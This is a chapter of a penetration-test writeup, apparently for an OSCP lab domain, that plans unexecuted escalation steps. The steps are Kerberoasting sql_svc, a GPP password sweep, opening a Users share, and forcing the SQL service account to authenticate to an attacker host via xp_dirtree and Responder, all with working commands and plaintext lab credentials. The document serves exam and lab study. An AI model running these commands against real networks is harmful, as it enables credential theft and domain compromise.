# 07 — Next actions

> **Not yet executed.** Everything on this page is the plan that follows from chapters 01–06. No result
> is claimed here. When these run, this chapter is replaced with what actually happened.

With every ACL path closed and every local token exhausted, the only lever left is a credential we do
not have. Three independent lines of evidence name the same one.

---

## 7.1 Why `sql_svc`

| Chapter | What it establishes |
|---|---|
| 03 — MSSQL | `xp_cmdshell` runs as the **SQL service account**, so that security context is the escalation target |
| 04 — Domain recon | `sql_svc` holds `MSSQL/MS02.oscp.exam` and is **Kerberoastable** |
| 05 — BloodHound | it is the only account with an SPN **and** a four-year-old password, in a directory with no writable edges |

`sql_svc` *is* the context `xp_cmdshell` would run in. A cracked `sql_svc` is therefore not just another
domain user — it is an account whose privileges on MS02 are unknown and may include
`SeImpersonatePrivilege`, which neither login we hold does. Its password has not changed since
**2022-12-05**, on a service account, which is the profile that cracks.

---

## 7.2 Action 1 — Roast it

```bash
impacket-GetUserSPNs oscp.exam/celia.almeda:'7k8XHk3dMtmpnC7' \
  -dc-ip 10.10.152.140 -request -outputfile kerb.txt

hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

Prerequisite: the hosts entry and clock sync from chapter 06.4. Without them this fails identically to
chapter 04.

If it cracks, the next test is whether `sql_svc` can log in over WinRM or SMB, and whether its token
carries `SeImpersonate`:

```bash
nxc winrm 10.10.152.142 -u sql_svc -p '<cracked>'
nxc smb   10.10.152.142 -u sql_svc -p '<cracked>' --shares
```

`SeImpersonate` on that account, plus a service already running as it, is the SYSTEM path on MS02.

---

## 7.3 Action 2 — The share nobody has opened

`Users` is not a default share on a domain controller, and `eric.wallows` can read it.

```bash
smbclient //10.10.152.140/Users -U 'oscp.exam%EricLikesRunning800' -c 'recurse ON; ls'
```

This is the highest-value **unexamined** surface in the engagement: a custom share holding user data,
mounted on the DC, readable by a plain domain user. Scripts, config files and second credentials are the
usual occupants.

---

## 7.4 Action 3 — GPP sweep

Cheap, and it fails closed:

```bash
nxc smb 10.10.152.140 -u eric.wallows -p 'EricLikesRunning800' -M gpp_password
nxc smb 10.10.152.140 -u eric.wallows -p 'EricLikesRunning800' -M gpp_autologin
```

A `cpassword` in `SYSVOL` decrypts with a published key, so any hit is immediate plaintext.

---

## 7.5 Action 4 — Borrow the service account's hash

If the roast fails, `xp_dirtree` reaches the same account from a different direction — and it needs no
privilege at all, because `public` can execute it:

```bash
sudo responder -I tun0 -v
```

```sql
EXEC master..xp_dirtree '\\<tun0-address>\loot', 1, 1;
```

The outbound authentication comes from the **MSSQL service account**, not from the SQL login that
issued the query. Crack the NetNTLMv2 with `hashcat -m 5600`. Same target as 7.2, reached without
Kerberos — which makes it the fallback of choice while DNS and the clock are still broken.

---

## 7.6 Action 5 — Re-collect once Kerberos works

The graph in chapter 05 came from an NTLM fallback with **zero** session results. A Kerberos-backed
collection may expose sessions and local group memberships this run could not see:

```bash
bloodhound-python -d oscp.exam -u celia.almeda -p '7k8XHk3dMtmpnC7' \
  -ns 10.10.152.140 -dc DC01.oscp.exam -c All
```

Treat the empty session table as **"not observed"**, not "proven absent", until this runs.

---

## 7.7 Order

1. hosts entry + `ntpdate` — nothing Kerberos-based works without it
2. roast `sql_svc` — the convergence point
3. open the `Users` share — the only unexamined surface
4. GPP sweep — one command, immediate payoff if present
5. `xp_dirtree` capture — the Kerberos-free route to the same account
6. re-collect BloodHound — to correct the "no sessions" reading

Steps 2 and 5 attack the same account by different means, so a failure of one is not a failure of the
other.

---

## 7.8 What this page will become

When the chain completes, this chapter is replaced by the escalation writeup, with the capture that
proves the boundary was crossed — and the `proof.txt` value read in the same session as `whoami`,
`hostname` and `ipconfig`, so the result is attributable rather than asserted.

Until then, the honest statement is the one in chapter 06: **MS02 is a foothold, DC01 is not owned, and
the way in is a service account whose password has not changed since 2022.**
